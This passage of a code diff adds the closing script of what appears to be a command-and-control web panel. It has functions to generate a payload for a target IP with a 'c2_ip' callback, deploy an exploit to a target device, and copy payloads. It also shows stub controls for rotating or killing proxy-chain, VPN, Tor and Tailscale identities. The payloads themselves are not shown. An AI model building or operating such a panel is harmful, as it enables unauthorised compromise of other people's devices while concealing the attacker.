+}
+
+// Payload Generator
+async function generatePayload() {
+  const targetIp = document.getElementById('payload-ip').value;
+  const family = document.getElementById('payload-family').value;
+  if (!targetIp) {
+    alert('Please enter a target IP address');
+    return;
+  }
+  addLog(`Generating payload for ${targetIp} (${family})...`);
+  const result = await api('/api/payload', 'POST', { target_ip: targetIp, family, c2_ip: localIp });
+  document.getElementById('payload-text').textContent = result.payload;
+  document.getElementById('payload-modal').classList.add('active');
+  addLog(`Payload generated for ${targetIp}`);
+}
+
+async function deployPayload() {
+  const targetIp = document.getElementById('payload-ip').value;
+  const family = document.getElementById('payload-family').value;
+  if (!targetIp) {
+    alert('Please enter a target IP address');
+    return;
+  }
+  addLog(`Deploying exploit to ${targetIp}...`);
+  await api('/api/command', 'POST', { device_id: targetIp, command: 'deploy', params: { family } });
+  addLog(`Exploit deployed to ${targetIp}`);
+}
+
+function closePayloadModal() {
+  document.getElementById('payload-modal').classList.remove('active');
+}
+
+function copyPayload() {
+  const text = document.getElementById('payload-text').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    addLog('Payload copied to clipboard');
+  });
+}
+
+// Server Info
+async function loadServerInfo() {
+  // Simulated server info
+  document.getElementById('srv-ipv4').textContent = localIp || '192.168.1.100';
+  document.getElementById('srv-ipv6').textContent = 'fe80::1';
+  document.getElementById('srv-mac').textContent = 'AA:BB:CC:DD:EE:FF';
+  document.getElementById('srv-proxy').textContent = 'Inactive';
+  document.getElementById('srv-proxy-ip').textContent = '—';
+  document.getElementById('srv-vpn').textContent = 'Inactive';
+  document.getElementById('srv-vpn-ip').textContent = '—';
+  document.getElementById('srv-tor').textContent = 'Inactive';
+  document.getElementById('srv-tor-ip').textContent = '—';
+  document.getElementById('srv-tor-loc').textContent = '—';
+  document.getElementById('srv-tailscale').textContent = 'Inactive';
+}
+
+function changeProxyIdentity() { addLog('Changing proxy-chain identity...'); }
+function changeVpnIdentity() { addLog('Changing VPN identity...'); }
+function killProxyChain() { addLog('Killing proxy-chain...'); }
+function killVpn() { addLog('Killing VPN...'); }
+function killTor() { addLog('Killing Tor...'); }
+function killTailscale() { addLog('Killing Tailscale...'); }
+
+// Poll for updates
+async function poll() {
+  await loadDevices();
+  await loadClips();
+  await loadLocalIp();
+  await loadServerInfo();
+  setTimeout(poll, 3000);
+}
+
+poll();
+</script>
+</body>
+</html>
